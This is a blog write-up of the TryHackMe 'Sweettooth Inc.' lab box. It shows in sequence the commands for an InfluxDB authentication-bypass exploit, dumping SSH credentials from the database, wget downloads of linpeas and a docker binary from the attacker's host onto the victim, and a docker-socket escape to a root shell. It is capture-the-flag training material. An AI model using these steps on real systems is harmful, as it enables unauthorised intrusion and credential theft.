---
layout: post
title:  "Sweettooth Inc. Writeup"
date:   2024-05-22 13:15:45 -0400
categories: writeup tryhackme medium
---
# Introduction
This is a medium challenge box on 
[TryHackMe](https://tryhackme.com/r/room/sweettoothinc){:target="_blank"}{:rel="noopener noreferrer"}
> This is what a hint will look like!

# Enumeration

## Ports
As always let's run a few scans to see what ports are 
open and what services are running

### Rustscan
[Rustscan](https://github.com/RustScan/RustScan){:target="_blank"}{:rel="noopener noreferrer"}
is a helpful port scanner that runs faster than a full
nmap scan

```bash
rustscan -a VICTIM_IP
```

![rust-scan](/images/sweettooth-inc/rustscan.png)

### Nmap
We have 4 ports open so let's run some scripts against
them

```bash
nmap -A -p111,2222,8086,58425 -T4 -vv -oA ports VICTIM_IP
```

![nmap-scan](/images/sweettooth-inc/nmap.png)

There are 2 ports to take note of

- 2222: SSH
- 8086: HTTP

# Initial Foothold
> Search the internet for exploits with the running 
services and versions

According to our scan, port 8086 is running InfluxDB
version 1.3.0. Let's search the internet for some exploits

## Authentication Bypass
One of the first results is 
[CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933){:target="_blank"}{:rel="noopener noreferrer"}
which is an authentication bypass vulnerability in 
InfluxDB < 1.7.6. Version 1.3.0 fulfills that 
requirement so let's try this out!

```bash
git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
cd InfluxDB-Exploit-CVE-2019-20933
pip3 install -r requirements.txt
python3 __main__.py
```

![influx-roadblock](/images/sweettooth-inc/influx-roadblock.png)

Oh no, we don't know the username! We could brute 
force usernames in the background but that won't be 
necessary. There is another way

## Username
> You don't need to brute force. Keep searching the 
> internet for exploits with the specific version

Continuing our public exploit search, we find an interesting 
[blog post](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day){:target="_blank"}{:rel="noopener noreferrer"}.
By visiting `<IP>:8086/debug/requests`  a username on the system is leaked!

![username-leak](/images/sweettooth-inc/username-leak.png)

## Database
> Did you leak everything from the database?

We have a username to bypass authentication with, so 
let's leak some data. Connect to the database with the 
previous authentication bypass exploit

```bash
python3 __main__.py
```
On the database screen type the name you want to use. 
Remember you can use `.back`  to change databases. Table 
and column names can be listed with the command

```sql
show field keys
```

Getting all data entries for a table is in the format

```sql
select * from table_name
```

We're asked two questions to leak database information. 
First we need to convert the given UTC Unix Timestamp to 
something more... readable. I used 
[this converter](https://epochtimestamp.com/){:target="_blank"}{:rel="noopener noreferrer"}
and sifted through the entries. We're looking for a 
temperature similar to the time 
`2021-05-18T10:00:00-04:00`

```sql
tanks
show field keys
select temperature from water_tank
```

![water-temp](/images/sweettooth-inc/water-temp.png)

Next we need to find the highest rpm for the mixer. 
Switch databases and sift through the entries again

```sql
.back
mixer
show field keys
select field_rpm from mixer_stats
```

![motor-rpm](/images/sweettooth-inc/motor-rpm.png)

The same process can be done to leak ssh credentials

```sql
.back
creds
show field keys
select * from ssh
```

![db-ssh](/images/sweettooth-inc/database-ssh2.png)

Let's use these ssh credentials. 
Remember from our scan that ssh is on port 2222!

```bash
ssh user@VICTIM_IP -p 2222
```

# Privilege Escalation
> linpeas will nudge you in the right direction

## linpeas
Upload the privesc script
[linpeas.sh](https://github.com/peass-ng/PEASS-ng){:target="_blank"}{:rel="noopener noreferrer"}
so we can find an avenue to escalate our privileges

```bash
# Attacker machine, in a directory with linpeas.sh
python3 -m http.server 80

# Victim machine
wget http://YOUR_IP/linpeas.sh
sh linpeas.sh
```

![docker-linpeas](/images/sweettooth-inc/docker-linpeas.png)

> User essentially has docker privileges without 
> the docker binary

`/run/docker.sock` is writable, meaning we have docker 
privileges! We can escape and elevate our privileges 
but there's one problem...

![docker-mising](/images/sweettooth-inc/docker-missing.png)

The docker binary is missing!

Normally we can install packages on Debian based systems 
with the command

```bash
sudo apt-get install <package-name> 
```

But if we could use sudo, we wouldn't have this issue in 
the first place

> If we had the docker binary available, 
> we could escalate our privileges...

Thankfully we can download the
[docker binary directly](https://download.docker.com/linux/static/stable/x86_64/){:target="_blank"}{:rel="noopener noreferrer"}!
Let's upload docker and try it out

## Docker Upload
```bash
# Attacker machine, in a directory with the docker file
python3 -m http.server 80

# Victim machine
wget http://YOUR_IP/docker-17.03.0-ce.tgz
tar xf docker-17.03.0-ce.tgz
cd docker
./docker images
```
![docker-test](/images/sweettooth-inc/docker-test.png)

Everything works, so let's elevate our privileges

# Root
> Is there a GTFO bin for docker?
[GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell){:target="_blank"}{:rel="noopener noreferrer"}
has an entry for creating a shell with docker

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Let's just replace alpine with a docker image we have 
access to and run the local docker binary

```bash
./docker run -v /:/mnt --rm -it influxdb:1.3.0 chroot /mnt sh
```

Root shell! Funnily enough we're already root on the host 
instead of the container. We've achieved our goal so 
let's get the remaining flags

```bash
find / -type f -name "*root.txt*" -ls 2>/dev/null
```

```bash
280243  4 -rw-r--r-- 1 root root  22 May 15  2021 /root/root.txt
  1700  4 -rw-r--r-- 1 root root  22 May 18  2021 /var/lib/docker/aufs/mnt/33d446f7c7981fe737a399371821828a94aedd9af216ca12a0845a4818a48c6c/root/root.txt
927203  4 -rw-r--r-- 1 root root  22 May 18  2021 /var/lib/docker/aufs/diff/20629420626c70a9bdf5807427da0badebc8e5d842cb82ae3ff83822b18c9e2a/root/root.txt
```

# Recap
A vulnerable version of InfluxDB leads to leaking a 
username as well as an authentication bypass. Database 
access leaks ssh credentials and provides a foothold into 
a docker container. We essentially have docker privileges 
since docker.sock is writable, but the docker binary is 
not available. Uploading the binary and using the docker 
gtfobin gives root.
